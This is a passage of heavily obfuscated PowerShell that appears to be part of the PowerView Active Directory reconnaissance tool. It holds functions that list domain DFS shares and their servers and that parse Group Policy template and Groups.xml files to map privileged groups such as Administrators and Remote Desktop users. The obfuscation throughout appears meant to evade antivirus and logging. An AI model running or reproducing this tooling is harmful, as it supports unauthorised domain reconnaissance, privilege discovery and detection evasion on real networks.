               ${b`LOb_nA`me_Si`ze} =   (  &('lS')  varIAblE:wXMo )."Val`Ue"::"t`OUIN`T16"(${b`in}[${b`Lo`B_NAMe_`sI`Z`e_start}..${BL`OB_NaME`_s`I`z`E_end}],0)

               ${bLOb_N`A`mE`_sTa`Rt} = ${BL`oB_NAMe_`siZe`_END} + 1
               ${Blo`B_N`AM`e_END} = ${b`LO`B`_N`Ame_StaRt} + ${blOB`_N`AM`e_s`Ize} - 1
               ${bLO`B_N`AmE} =   ( &("{1}{0}{2}"-f 'VarIABL','gEt-','E') ydPEl)."VAL`Ue"::"uN`IC`ode"."getS`TR`ING"(${B`IN}[${b`lob`_NA`Me_st`ArT}..${BLOB`_NAm`e_eNd}])

               ${bLOB_DATa_sI`ZE`_s`TART} = ${BL`ob_N`AmE`_`ENd} + 1
               ${Bl`ob`_d`ATa`_SiZE_ENd} = ${blob`_DA`T`A_sIzE_`s`TaRT} + 3
               ${blO`B_`Da`Ta_SIZe} =   (&("{1}{0}{2}" -f 'arIA','geT-v','BLE') ('WxM'+'O'))."val`Ue"::"touInt`32"(${B`in}[${BLOb`_`D`ATa_size`_`sTARt}..${b`LOB_D`At`A_Siz`E_End}],0)

               ${bL`ob_`DA`TA_stART} = ${bLOb_D`A`TA_`size_END} + 1
               ${bL`o`B`_DATa_E`Nd} = ${BlO`B`_DaT`A_STA`RT} + ${B`Lob_daTa`_S`IzE} - 1
               ${b`lob_`dATa} = ${B`In}[${bL`Ob`_`d`ATa_start}..${bLob_DA`Ta_e`ND}]
               switch -wildcard (${b`lOb_Na`me}) {
                ((("{2}{3}{0}{1}"-f 'it','eroot','Aj','Ps'))-replACE  ([char]65+[char]106+[char]80),[char]92) {  }
                ((("{2}{0}{3}{4}{1}"-f 'dom','t*','{0}','ainr','oo')) -f  [char]92) {
                    
                    
                    ${RO`oT_or`_LINK_gUi`D_`s`TA`RT} = 0
                    ${rO`oT`_o`R_L`InK_G`UI`d_eND} = 15
                    ${ro`o`T_OR`_`lin`K_Guid} = [byte[]]${bLob`_Da`TA}[${rOoT`_O`R_`liNk_G`Uid_stArT}..${roo`T`_OR_`LiNk_G`U`I`d_eND}]
                    ${gU`ID} = &("{1}{2}{3}{0}" -f 'Object','N','ew','-') ("{1}{0}"-f'd','Gui')(,${root_`o`R_li`NK`_`GuiD}) 
                    ${pReFI`X`_`sIzE`_STArt} = ${ROoT_OR_liNK_G`U`i`D`_ENd} + 1
                    ${pREf`iX_`Si`ze_end} = ${pre`FIX`_SIzE`_S`TARt} + 1
                    ${PRe`Fix`_SIZe} =  ${Wx`Mo}::"tO`UIn`T16"(${B`LOb_d`AtA}[${p`REFIX_S`iz`E_stArt}..${prefi`X_si`ZE`_ENd}],0)
                    ${PrEFI`X_`sT`ArT} = ${prEFIx`_SIZE`_E`ND} + 1
                    ${PrEFI`X`_end} = ${Pr`ef`ix_STaRt} + ${PR`e`FIX_size} - 1
                    ${P`ReF`Ix} =   (&("{0}{1}{2}"-f'vA','R','iabLe')  ('Y'+'DpEL') -VaLuEOn  )::"Unic`OdE"."GeTs`TRi`Ng"(${bloB_`D`Ata}[${p`R`EfIX_`S`TaRt}..${p`ReFi`x_END}])

                    ${SHort`_PRefi`x_siZE_S`T`ArT} = ${P`R`efIX`_enD} + 1
                    ${s`HORT`_pReF`Ix_si`ze_End} = ${sH`O`RT_`p`RE`Fix_size_staRT} + 1
                    ${S`hO`Rt_PRE`Fi`x_SIZE} =   ${Wx`MO}::"Tou`iNt16"(${B`lob_DA`TA}[${ShoRt_pR`E`Fix_s`iz`e`_sTA`RT}..${SHo`R`T_`PrEfIx_si`ZE_`End}],0)
                    ${shoRT_p`REfi`X_s`TArT} = ${SHort_`PReFIX`_`S`IZe_`E`Nd} + 1
                    ${s`HorT_pRe`FI`X_e`Nd} = ${Sh`ORT`_`P`REfiX_`STArT} + ${shO`Rt`_p`RefIx_S`I`ze} - 1
                    ${sh`ort_`PREfIx} =   ${Y`d`pel}::"UNiCO`dE"."GET`S`TRi`Ng"(${BLo`B`_Data}[${S`hOrt_prEfix_S`T`ARt}..${s`H`ort_pREFI`X_e`ND}])

                    ${T`Ype_`sTaRT} = ${SHor`T_`pReFiX_`EnD} + 1
                    ${Ty`pe_E`ND} = ${TY`PE_S`TaRt} + 3
                    ${TY`pE} =   (  &("{1}{0}{3}{2}" -f 't-','Ge','ble','vAriA')  ("WX"+"mo") -ValuE )::"TO`Ui`Nt32"(${BlOb_`DA`Ta}[${type_`Sta`Rt}..${T`YPE_`end}],0)

                    ${St`AT`E_STArT} = ${TYp`e_end} + 1
                    ${S`Tate`_END} = ${stAte`_sT`Art} + 3
                    ${S`TATE} =  ( &('gI') ("v"+"aRiAbLe"+":WXmO"))."VA`lUe"::"ToUi`NT32"(${bLOB`_dA`Ta}[${s`TatE_`ST`Art}..${sta`Te_`enD}],0)

                    ${cOMmE`Nt_`Size_`S`TaRt} = ${S`TA`TE_eND} + 1
                    ${C`omMENt_sIzE_`E`ND} = ${Co`mment_s`I`ze_start} + 1
                    ${cO`Mm`enT`_size} =   ${Wx`mO}::"T`OUiNT`16"(${bLOb`_`DAtA}[${C`OM`MEN`T`_sIz`e_Sta`Rt}..${COm`Me`Nt_`S`IZe_End}],0)
                    ${C`omMENT_s`T`A`RT} = ${C`OM`meNT_SIze`_End} + 1
                    ${comM`e`Nt_`EnD} = ${cO`MmenT`_`stArT} + ${COMmEn`T_s`izE} - 1
                    if (${coMM`eN`T_sIZE} -gt 0)  {
                        ${C`OMMe`NT} =   (  &('gi') vAriAbLe:YdpEL  )."v`AlUe"::"u`NI`cOde"."GE`TS`Tring"(${BL`ob_D`ATa}[${com`mEN`T_sTA`Rt}..${Com`mE`NT_eNd}])
                    }
                    ${Pre`F`ix_T`iMe`stA`mp_sT`ART} = ${CoMM`eNt_`eND} + 1
                    ${prefix_tIM`EsT`AM`P`_END} = ${PREF`i`x_tim`E`s`TaMP_`sTARt} + 7
                    
                    ${P`RE`Fix`_tImEstamP} = ${BloB`_`DaTA}[${PRE`FI`X_t`imes`TAMp_StaRT}..${Prefix`_TI`M`eS`TAmP_eND}] 
                    ${stA`TE_TIMest`A`M`P_s`T`Art} = ${p`R`EfIx_tImE`S`Ta`mP_End} + 1
                    ${S`TATE_TI`me`sTA`mp`_eNd} = ${StATe_tIM`est`Am`P_st`ArT} + 7
                    ${stAtE`_`TI`mEStA`mP} = ${BLOb`_d`ATa}[${s`T`A`Te_tIm`EstAmp_S`T`Art}..${st`ATE_`TimEst`AM`p_eND}]
                    ${CommE`Nt`_`TImE`STamp_st`ART} = ${Sta`Te_ti`M`ESt`Am`p_End} + 1
                    ${COmmEnt_TI`M`e`STAM`P_`eNd} = ${c`oMm`en`T_TiM`ESTAm`p`_StART} + 7
                    ${coMM`E`NT_`TIMest`AMP} = ${b`l`ob_Data}[${cOMment_T`iMest`A`Mp`_s`TArT}..${c`oMmENT_`T`IMesTa`M`p_eND}]
                    ${VE`Rsi`ON_`staRt} = ${coMm`EN`T_tI`MEsTAmp_e`Nd}  + 1
                    ${V`Er`SION`_eNd} = ${VeR`Si`On_`staRT} + 3
                    ${Vers`ion} =   ${wX`mo}::"t`oui`NT32"(${Bl`Ob_`da`Ta}[${vErS`IOn_s`Tart}..${Ve`RsioN_`e`Nd}],0)

                    
                    ${Df`S`_TArge`TLisT`_BLob_Si`ze_`s`TART} = ${ve`RsioN`_`End} + 1
                    ${DFs`_T`ARGeTlIs`T_Bl`o`B_sIZe_enD} = ${D`F`s_TaRgetl`ISt_bLO`B`_`siZe`_Start} + 3
                    ${df`S_Tar`gEtL`I`ST_`BL`Ob`_siZE} =   ${W`xmO}::"tO`UiN`T32"(${Blob`_`D`AtA}[${dfS_`Tar`GeT`l`i`sT_blOB_S`I`Ze_`sTArt}..${dfS_`TAR`GE`TlIsT_`BL`ob`_`Size`_enD}],0)

                    ${D`FS_targEtLIst_Blo`B_`s`T`ArT} = ${D`FS_TargETl`ISt_BLo`B_`sIze`_EnD} + 1
                    ${DfS_TArg`E`T`LIS`T_BLOB`_END} = ${DfS`_t`A`RG`EtlISt_B`l`OB_s`TART} + ${Dfs_`T`ArGEt`lIST_`BLo`B_s`izE} - 1
                    ${dFS`_`TaRGetL`isT_b`lob} = ${b`LoB`_dATA}[${Df`s_tar`gETLIS`T_BLOB`_S`TArt}..${Df`S_TArg`e`TlISt_B`lO`B_`eNd}]
                    ${ResE`Rve`D`_bLo`B_sIze_staRt} = ${d`Fs`_TARGetLIst`_bLob_e`Nd} + 1
                    ${re`S`eR`VED`_BLob_siZe_enD} = ${rese`R`VED`_BlOb_s`iZE_STa`Rt} + 3
                    ${re`sErVED_BLOB`_`sIze} =  (&("{1}{2}{0}" -f 'AbLe','v','aRi') WXMo  -VAlUEOn)::"t`ouiN`T32"(${BLOB_`d`ATA}[${r`e`sEr`V`ed_B`lOb_SIze_S`TA`RT}..${reseRv`E`D_bL`OB_`sIZE`_e`ND}],0)

                    ${R`EsErved_`B`l`OB_`sTarT} = ${RE`s`eRVed_`BLOb_s`izE_eND} + 1
                    ${REsERVed_B`L`o`B`_EnD} = ${rES`eR`VE`D_`B`LoB_STaRT} + ${Re`s`eR`VeD_blob`_`SIze} - 1
                    ${ReSErVe`D_b`LOB} = ${BLOb`_D`Ata}[${R`EServE`d_`BLob_S`TART}..${Res`E`RveD_`BLob_eNd}]
                    ${rEF`erRal`_`TTL_St`ArT} = ${RE`SE`R`Ve`d_blOB_END} + 1
                    ${RefeRra`L_ttL`_E`Nd} = ${Re`FErr`AL_TTl_st`ART} + 3
                    ${Re`F`erR`AL`_tTl} =   ${wX`mo}::"TOu`i`NT32"(${BL`O`B`_daTA}[${REF`eRRa`l_tt`l`_STaRT}..${rEFeRRal_T`TL`_`END}],0)

                    
                    ${t`ArGE`T_COun`T_`sta`RT} = 0
                    ${T`A`RgEt_co`UnT_E`ND} = ${TArget_CO`Un`T_`s`TARt} + 3
                    ${t`ARg`et_COunt} =  (  &("{0}{1}"-f'Ge','t-itEM')  vaRiable:wXMO )."v`ALuE"::"TOu`i`Nt32"(${dfS`_TArg`etlIst`_b`L`OB}[${TarGe`T_c`ouNt_S`TarT}..${tarG`et_`c`ouNt`_e`ND}],0)
                    ${T_`o`Ff`seT} = ${t`A`RgE`T_`cOUNT`_eNd} + 1

                    for(${j}=1; ${j} -le ${TArge`T_coU`Nt}; ${J}++){
                        ${TA`RGET_e`N`TrY`_SI`Ze_STart} = ${T_of`FS`Et}
                        ${TarG`Et_`ENt`Ry_Si`Ze_END} = ${tAr`gET_`enT`R`Y_siZe`_s`TArT} + 3
                        ${TArgET`_`E`NTr`y_SIzE} =  ( &("{0}{1}"-f 'Di','r') ("v"+"ARIablE:"+"wxmO")  )."vA`LUe"::"to`U`InT32"(${d`Fs_`TARgetL`ISt_bloB}[${T`ARg`ET`_enT`RY_siZE_Start}..${tARgET`_`EnTrY_s`I`ze_e`Nd}],0)
                        ${TAr`g`e`T_timE_`sTa`MP_`STArt} = ${tA`RgE`T_eNTR`Y_SI`z`E_End} + 1
                        ${Ta`RGeT_`Ti`ME_STa`mP_end} = ${T`A`RG`e`T_tIme_stAMp_`ST`ARt} + 7
                        
                        ${TA`R`g`ET`_tiME_sTamP} = ${dFS_taRg`EtLI`St`_`BloB}[${t`ARget_`TI`mE_StAm`P_S`T`A`Rt}..${taRGET_`TImE_`StAM`P`_E`Nd}]
                        ${tAR`g`ET`_s`TAtE_sTarT} = ${t`A`RGe`T_TImE_s`TaMp_e`ND} + 1
                        ${Ta`Rg`ET_S`TaTe_eND} = ${Targ`ET_stat`E_`s`TarT} + 3
                        ${tarGE`T_`sTa`Te} =   (&("{1}{0}{2}"-f'L','vArIAb','e') ('wx'+'mO'))."VA`LUE"::"T`ou`iNt32"(${dFs_T`ARGETl`I`st`_b`LOb}[${T`A`RGet_S`TATe_STa`Rt}..${targE`T_s`TAtE_`End}],0)

                        ${tar`gET`_`TypE_`sT`Art} = ${TArGEt`_`staT`e_`end} + 1
                        ${T`ARget_`TypE`_E`ND} = ${TARgET_Ty`p`e`_s`T`ARt} + 3
                        ${ta`RG`ET`_TyPe} =   ${w`XMo}::"touINT`32"(${Df`s_TArGetL`i`s`T`_`BLOb}[${t`A`Rg`E`T_T`yPe_sTArt}..${TA`RG`et`_`TyPe_eND}],0)

                        ${sERVE`R`_nam`E`_s`Iz`e_STarT} = ${TA`R`G`et_ty`Pe_EnD} + 1
                        ${SE`RVeR`_`NaME_sIZ`E_end} = ${SErv`eR_`NaM`e_`SiZe_`ST`ARt} + 1
                        ${sE`Rve`R_`NA`me_S`IZe} =  ${W`xmO}::"T`OUi`NT16"(${df`S_tA`R`ge`TLIS`T`_blob}[${sERV`E`R_Na`Me_sI`ze_`Sta`RT}..${s`eR`Ver_`N`Ame_S`I`ze_eNd}],0)

                        ${S`er`Ver_`N`AmE_S`TaRT} = ${sErVEr_`N`Ame_`sIze`_E`Nd} + 1
                        ${sE`Rv`ER`_name_E`ND} = ${SErV`e`R_naMe_st`ART} + ${s`ERVeR_`NAme`_SiZE} - 1
                        ${s`ERv`E`R_nAme} =   (&("{0}{1}"-f 'vaRIa','bLe') ydpeL)."vAl`Ue"::"U`NicoDE"."g`e`TStR`iNG"(${Df`S`_TaRgETLISt`_Blob}[${seRV`ER_n`A`m`e_Start}..${Se`RVE`R`_N`AmE_END}])

                        ${s`haRE_naME_`SiZE`_stA`RT} = ${SErVeR_`N`A`Me`_EnD} + 1
                        ${Sh`Are_nAMe_sizE_`e`ND} = ${sHarE_NA`ME_SIze_s`T`A`Rt} + 1
                        ${SHarE_`N`AmE_si`Ze} =   ${w`XMO}::"t`O`UInt16"(${D`FS_TArgE`TL`Ist_`BLob}[${SHARe`_n`Ame_Si`z`E_st`Art}..${Share_N`Ame_`Si`Ze_e`Nd}],0)
                        ${sHA`Re`_`NAM`E_sT`ART} = ${SHar`E_N`A`Me_sI`ze_`eNd} + 1
                        ${SHArE`_`Na`mE_ENd} = ${sHaRe`_n`AmE_sta`RT} + ${SHA`Re`_n`AMe_Si`zE} - 1
                        ${s`h`ARE_`NAMe} =  ${Yd`P`EL}::"U`NIcODe"."geTSTri`Ng"(${DfS_T`A`RGEtLiST`_bLOb}[${sHa`Re_`NaMe_`S`T`Art}..${S`H`ARe_n`Ame_e`Nd}])

                        ${Tar`gEt`_`liSt} += "\\$server_name\$share_name"
                        ${t_`O`F`FSEt} = ${shaR`e_`Name_`eNd} + 1
                    }
                }
            }
            ${o`FfSET} = ${Bl`o`B_DaTA_`end} + 1
            ${DF`S_pk`T_p`RoPer`TIeS} = @{
                ("{0}{1}" -f'Na','me') = ${b`lOB_NA`ME}
                ("{0}{1}"-f'Prefi','x') = ${P`RE`FIX}
                ("{0}{2}{1}"-f 'Targe','List','t') = ${ta`RGeT`_LiST}
            }
            ${OB`jec`T_L`isT} += &("{3}{2}{0}{1}" -f'bjec','t','ew-O','N') -TypeName ("{2}{0}{1}" -f 'bjec','t','PSO') -Property ${dFs`_`PkT_propeRT`Ies}
            ${P`Refix} = ${N`ULL}
            ${Bl`Ob_N`AME} = ${n`ULl}
            ${tArGet_l`I`St} = ${NU`ll}
        }

        ${s`ErVe`RS} = @()
        ${o`BJEcT`_lIst} | &("{1}{2}{0}{3}" -f 'rEac','F','o','h-Object') {
            if (${_}."TAr`GEtLi`sT") {
                ${_}."t`AR`gEtLIst" | &("{3}{0}{1}{2}{4}" -f 'orE','a','c','F','h-Object') {
                    ${se`Rv`eRs} += ${_}.("{1}{0}"-f'it','spl').Invoke("\")[2]
                }
            }
        }

        ${SE`R`VeRs}
    }

    function gEt-D`FsSHARE`V1 {
        [CmdletBinding()]
        param(
            [String]
            ${DOM`Ain},

            [String]
            ${d`O`Mai`N`cONtrO`llER},

            [String]
            ${a`DSp`AtH},

            [ValidateRange(1,10000)]
            [Int]
            ${PAG`E`sizE} = 200,

            [Management.Automation.PSCredential]
            ${c`Re`dENtiAl}
        )

        ${D`FSSEaRc`h`er} = &("{2}{0}{1}{3}" -f'Dom','ainSea','Get-','rcher') -Domain ${Do`mA`IN} -DomainController ${DoM`AiNC`ONT`ROllER} -Credential ${cr`edENti`Al} -ADSpath ${aDs`p`AtH} -PageSize ${P`A`gEsIzE}

        if(${D`FS`Se`ArCHER}) {
            ${dFs`S`h`Ares} = @()
            ${d`FsSeAr`chER}."Fi`L`TER" = ("{1}{0}{5}{3}{2}{4}" -f'&(o','(','ass=f','ctCl','TDfs))','bje')

            try {
                ${ResU`L`TS} = ${DfssEa`RCH`er}.("{1}{2}{0}" -f'l','F','indAl').Invoke()
                ${R`ESuL`TS} | &("{2}{1}{0}" -f'ct','re-Obje','Whe') {${_}} | &("{2}{0}{1}" -f 'rEac','h-Object','Fo') {
                    ${pr`OPe`RT`ieS} = ${_}."pRo`PERt`ieS"
                    ${rE`m`OTE`NaMEs} = ${p`ROp`erTIeS}."R`EmoteS`eRV`ern`AME"
                    ${P`Kt} = ${PR`Oper`T`IeS}."p`kT"

                    ${dFS`sha`Res} += ${r`emote`N`AmEs} | &("{3}{2}{0}{1}" -f 'b','ject','Each-O','For') {
                        try {
                            if ( ${_}.("{1}{0}" -f 'ins','Conta').Invoke('\') ) {
                                &("{0}{2}{1}"-f'Ne','t','w-Objec') -TypeName ("{0}{2}{1}" -f'P','t','SObjec') -Property @{("{1}{0}"-f 'e','Nam')=${PR`OPeR`TIEs}."NA`ME"[0];("{1}{3}{0}{2}"-f'rver','Rem','Name','oteSe')=${_}.("{1}{0}" -f 'lit','sp').Invoke("\")[2]}
                            }
                        }
                        catch {
                            &("{3}{1}{2}{0}"-f 'e','e','-Verbos','Writ') ('Error'+' '+'in'+' '+'par'+'sing '+'DF'+'S '+'s'+'h'+'are '+': '+"$_")
                        }
                    }
                }
                ${RE`S`Ults}.("{1}{2}{0}"-f'e','dis','pos').Invoke()
                ${dFS`sEar`cheR}.("{2}{0}{1}"-f 'p','ose','dis').Invoke()

                if(${P`Kt} -and ${P`Kt}[0]) {
                    &("{2}{1}{3}{0}"-f't','e-P','Pars','k') ${P`kT}[0] | &("{2}{3}{1}{0}"-f 'Object','h-','ForEa','c') {
                        
                        
                        
                        
                        
                        if (${_} -ne ("{0}{1}"-f 'nul','l')) {
                            &("{1}{2}{0}" -f'bject','Ne','w-O') -TypeName ("{0}{1}"-f 'PSOb','ject') -Property @{("{0}{1}" -f'N','ame')=${p`R`OPer`TiEs}."n`AME"[0];("{0}{3}{1}{2}"-f'Re','ServerNam','e','mote')=${_}}
                        }
                    }
                }
            }
            catch {
                &("{3}{1}{4}{2}{0}"-f'ing','-Wa','n','Write','r') ('Ge'+'t-DFSshare'+'V'+'1 '+'e'+'r'+'ror '+': '+"$_")
            }
            ${Dfs`SHa`RES} | &("{3}{2}{1}{0}"-f 'ject','b','t-O','Sor') -Property ("{0}{2}{3}{1}{4}" -f 'Re','erverNam','mote','S','e')
        }
    }

    function gET`-DfS`SHAr`Ev2 {
        [CmdletBinding()]
        param(
            [String]
            ${d`OMAin},

            [String]
            ${DoM`Ain`ConTR`O`LlEr},

            [String]
            ${adSP`A`Th},

            [ValidateRange(1,10000)]
            [Int]
            ${PAG`eS`izE} = 200,

            [Management.Automation.PSCredential]
            ${C`ReDenTI`Al}
        )

        ${DFSs`earcH`eR} = &("{3}{0}{2}{1}" -f 't-','Searcher','Domain','Ge') -Domain ${DOma`IN} -DomainController ${d`oMaIn`CONtROlL`eR} -Credential ${CREde`NTi`Al} -ADSpath ${A`Dsp`AtH} -PageSize ${P`AGesize}

        if(${DF`SSeARCh`er}) {
            ${DFSS`Har`ES} = @()
            ${dfS`SEARch`Er}."F`ILTer" = ("{1}{0}{2}{4}{3}" -f's=msDF','(&(objectClas','S','nkv2))','-Li')
            ${d`Fs`sEARcHEr}."p`ROp`ErT`I`EsToLOaD".("{1}{0}{2}" -f 'Ra','Add','nge').Invoke((("{1}{3}{0}{2}"-f'ath','ms','v2','dfs-linkp'),("{0}{3}{2}{1}" -f'msDFS-Ta','stv2','tLi','rge')))

            try {
                ${rEs`Ul`Ts} = ${dFs`SE`ARc`heR}.("{0}{1}{2}"-f 'F','ind','All').Invoke()
                ${r`eSUL`TS} | &("{1}{3}{0}{2}"-f'b','Where','ject','-O') {${_}} | &("{3}{1}{2}{0}"-f'bject','ach-','O','ForE') {
                    ${p`Ro`PertI`ES} = ${_}."Pr`OPEr`TI`ES"
                    ${Ta`Rg`Et`_liST} = ${P`ROPeR`TiES}.'msdfs-targetlistv2'[0]
                    ${X`mL} = [xml] ${Y`d`pEL}::"U`N`icoDe"."GEtS`Tr`iNG"(${TaRgET`_`LisT}[2..(${TARGe`T_li`st}."lEn`g`Th"-1)])
                    ${dfsS`h`ArEs} += ${x`Ml}."taRG`e`TS"."C`hiLd`NodEs" | &("{1}{0}{2}" -f 'ch-Obj','ForEa','ect') {
                        try {
                            ${T`Arg`ET} = ${_}."InnER`TExT"
                            if ( ${t`ARG`Et}.("{1}{0}{2}" -f 'on','C','tains').Invoke('\') ) {
                                ${Df`Sr`oOt} = ${tA`RGET}.("{0}{1}"-f 'sp','lit').Invoke("\")[3]
                                ${s`Hare`N`AmE} = ${P`Ro`pERTI`Es}.'msdfs-linkpathv2'[0]
                                &("{1}{2}{3}{0}"-f'ct','N','e','w-Obje') -TypeName ("{0}{2}{1}" -f 'PSObj','ct','e') -Property @{("{1}{0}"-f'me','Na')="$DFSroot$ShareName";("{2}{0}{3}{1}"-f'eServ','Name','Remot','er')=${tA`R`GeT}.("{0}{1}"-f'spl','it').Invoke("\")[2]}
                            }
                        }
                        catch {
                            &("{1}{3}{0}{2}"-f 'rbo','Write','se','-Ve') ('Er'+'ror '+'i'+'n '+'pa'+'rs'+'ing '+'ta'+'rget '+': '+"$_")
                        }
                    }
                }
                ${ReS`U`Lts}.("{0}{1}"-f'disp','ose').Invoke()
                ${d`FSS`EA`RCHEr}.("{2}{0}{1}" -f'sp','ose','di').Invoke()
            }
            catch {
                &("{3}{1}{0}{2}"-f'ite-Wa','r','rning','W') ('Ge'+'t'+'-DFS'+'share'+'V2 '+'erro'+'r '+': '+"$_")
            }
            ${dFs`sH`ArEs} | &("{1}{0}{2}"-f'bj','Sort-O','ect') -Unique -Property ("{2}{0}{4}{1}{3}" -f 've','a','RemoteSer','me','rN')
        }
    }

    ${DF`s`ShArES} = @()

    if ( (${V`E`RSiOn} -eq "all") -or (${vE`R`SIon}.("{2}{0}{1}" -f 'sWi','th','end').Invoke("1")) ) {
        ${dFSSh`A`RES} += &("{1}{0}{2}"-f '-D','Get','FSshareV1') -Domain ${D`OM`Ain} -DomainController ${dOMAI`Nco`NtRo`Ll`ER} -Credential ${cREDEn`T`iAL} -ADSpath ${a`D`sPAth} -PageSize ${p`Ag`eSize}
    }
    if ( (${V`Ers`iON} -eq "all") -or (${VEr`Si`On}.("{2}{1}{0}" -f'sWith','d','en').Invoke("2")) ) {
        ${DfS`S`HAR`Es} += &("{0}{2}{1}" -f'G','hareV2','et-DFSs') -Domain ${d`OM`AiN} -DomainController ${dOM`AinC`OntRO`L`leR} -Credential ${credEn`Ti`Al} -ADSpath ${aDSp`A`Th} -PageSize ${p`AGeSI`zE}
    }

    ${D`F`SShArEs} | &("{2}{3}{1}{0}" -f 'ject','Ob','S','ort-') -Property (("{3}{4}{0}{1}{2}" -f 'eSe','rve','rName','Re','mot'),("{0}{1}"-f'Nam','e')) -Unique
}








function g`et-`gpTT`mpL {


    [CmdletBinding()]
    Param (
        [Parameter(manDaTOry=${t`RUe}, VaLuEfrOMPIPElINE=${Tr`Ue})]
        [String]
        ${gp`T`TmPlP`AtH},

        [Switch]
        ${us`epSdRi`Ve}
    )

    begin {
        if(${UsE`Ps`dr`ivE}) {
            
            ${PAr`Ts} = ${g`PT`TmPLpa`TH}.("{1}{0}" -f 'lit','sp').Invoke('\')
            ${FOLd`eRP`Ath} = ${Pa`R`Ts}[0..(${P`ARTs}."LE`NgTH"-2)] -join '\'
            ${F`Il`EpA`Th} = ${pAR`Ts}[-1]
            ${r`A`NDDri`Ve} = (("{3}{6}{4}{2}{0}{5}{1}" -f'mnop','vwxyz','jkl','abcde','i','qrstu','fgh').("{2}{1}{0}{3}"-f'ra','arAr','ToCh','y').Invoke() | &("{3}{1}{0}{2}"-f'-Rand','et','om','G') -Count 7) -join ''

            &("{1}{0}{2}" -f 'erbo','Write-V','se') ('M'+'ount'+'ing'+' '+'p'+'ath '+"$GptTmplPath "+'us'+'ing '+'a '+'te'+'mp '+'PSDriv'+'e '+'a'+'t '+"$RandDrive")

            try {
                ${n`ULL} = &("{0}{2}{3}{1}"-f 'N','rive','ew-','PSD') -Name ${RAn`dd`RIvE} -PSProvider ("{1}{2}{0}" -f 'stem','FileS','y') -Root ${FOlD`ERpA`Th}  -ErrorAction ("{0}{1}" -f 'St','op')
            }
            catch {
                &("{2}{1}{3}{0}{4}" -f'erb','ite-','Wr','V','ose') ('Er'+'ror '+'m'+'ounti'+'ng '+'pat'+'h '+"$GptTmplPath "+': '+"$_")
                return ${NU`LL}
            }

            
            ${t`AR`G`etG`P`TTmplPAtH} = ${ra`Ndd`RI`VE} + ":\" + ${fiL`e`pAth}
        }
        else {
            ${T`Ar`GETG`pt`TMPLPAth} = ${g`pttmPLP`ATh}
        }
    }

    process {
        try {
            &("{3}{2}{1}{0}"-f'erbose','-V','e','Writ') ('Attempt'+'in'+'g '+'t'+'o '+'parse'+' '+'GptTmp'+'l: '+"$TargetGptTmplPath")
            ${TaRG`E`T`GPt`TmpLP`Ath} | &("{0}{2}{1}" -f 'Get-IniConte','t','n') -ErrorAction ("{3}{1}{0}{2}{4}" -f 'y','ilentl','Contin','S','ue')
        }
        catch {
            
        }
    }

    end {
        if(${u`SE`pSdri`Ve} -and ${R`A`N`dDRIvE}) {
            &("{0}{2}{1}"-f 'Wr','te-Verbose','i') ('Remo'+'ving'+' '+'temp'+' '+'P'+'SDri'+'ve '+"$RandDrive")
            &("{0}{2}{3}{1}"-f'Ge','rive','t','-PSD') -Name ${Ra`Nddri`Ve} -ErrorAction ("{1}{0}{3}{2}{4}" -f'n','Sile','ontin','tlyC','ue') | &("{0}{4}{3}{1}{2}" -f 'Re','ri','ve','-PSD','move') -Force
        }
    }
}


function Get-GR`o`U`Psx`ml {


    [CmdletBinding()]
    Param (
        [Parameter(MAndAToRY=${t`RuE}, vAlueFrOMpIpeLinE=${t`RUE})]
        [String]
        ${g`ROUpsX`MlPatH},

        [Switch]
        ${u`Se`p`sdRivE}
    )

    begin {
        if(${us`E`psd`RiVE}) {
            
            ${paR`Ts} = ${GRo`UPsxmlP`A`TH}.("{1}{0}"-f 't','spli').Invoke('\')
            ${fol`DErP`ATH} = ${Pa`RTS}[0..(${P`AR`TS}."l`e`NgTH"-2)] -join '\'
            ${Fi`le`paTh} = ${PAr`Ts}[-1]
            ${RAnD`Dri`Ve} = (("{3}{4}{7}{5}{2}{0}{6}{1}"-f'klmnopqrs','yz','j','a','bcd','hi','tuvwx','efg').("{1}{0}{3}{2}" -f 'r','ToCharA','y','ra').Invoke() | &("{0}{1}{2}"-f 'Get','-Rando','m') -Count 7) -join ''

            &("{3}{4}{2}{1}{0}"-f'se','Verbo','te-','Wr','i') ('Mount'+'ing'+' '+'p'+'ath '+"$GroupsXMLPath "+'usin'+'g '+'a '+'te'+'mp '+'P'+'SDrive '+'at'+' '+"$RandDrive")

            try {
                ${n`ULl} = &("{0}{2}{3}{1}"-f'New-P','e','SD','riv') -Name ${r`An`dd`RiVE} -PSProvider ("{2}{0}{1}" -f 'ste','m','FileSy') -Root ${fO`lD`ERP`ATH}  -ErrorAction ("{1}{0}"-f'op','St')
            }
            catch {
                &("{1}{2}{3}{0}"-f 'e','Wr','i','te-Verbos') ('E'+'rror '+'mo'+'u'+'nting '+'pa'+'th '+"$GroupsXMLPath "+': '+"$_")
                return ${NU`LL}
            }

            
            ${Targe`T`gr`oUPs`XmL`path} = ${ra`N`Dd`RIVE} + ":\" + ${fIL`EPA`TH}
        }
        else {
            ${TarG`et`gRoUpS`X`mLp`ATH} = ${Grou`Ps`xmLPA`TH}
        }
    }

    process {

        try {
            &("{2}{1}{3}{0}"-f 'se','e-','Writ','Verbo') ('Atte'+'mptin'+'g '+'to'+' '+'pars'+'e'+' '+'Gro'+'up'+'s.xml:'+' '+"$TargetGroupsXMLPath")
            [XML]${GR`ou`p`sXMLConteNT} = &("{2}{0}{3}{1}" -f '-Co','ent','Get','nt') ${tARgE`TG`R`OuPSXml`path} -ErrorAction ("{1}{0}" -f'p','Sto')

            
            ${Gr`OuPsXML`Con`Te`Nt} | &("{1}{2}{0}" -f'ml','Select','-X') ("{1}{0}" -f'Groups','//') | &("{0}{1}{2}"-f'Select','-','Object') -ExpandProperty ("{1}{0}"-f'e','nod') | &("{1}{3}{0}{2}"-f 'h-Ob','ForE','ject','ac') {

                ${gRoU`p`N`AMe} = ${_}."g`ROuP"."Pr`oPErTi`ES"."GRO`UPn`A`Me"

                
                ${GROuP`S`iD} = ${_}."G`ROup"."p`ROpeRt`Ies"."Gr`O`UPsid"
                if(-not ${lO`caLS`iD}) {
                    if(${Gr`OUp`N`Ame} -match ("{2}{1}{0}{4}{3}" -f 't','s','Admini','ators','r')) {
                        ${GR`ouP`SId} = ("{2}{3}{0}{1}"-f '-5','44','S-1-','5-32')
                    }
                    elseif(${gr`O`UpnaMe} -match ("{3}{4}{2}{0}{1}" -f'skto','p','e','Remot','e D')) {
                        ${GRoU`p`Sid} = ("{1}{2}{0}{3}" -f'5-32-','S-1','-','555')
                    }
                    elseif(${g`R`ou`pNamE} -match ("{0}{1}"-f'G','uests')) {
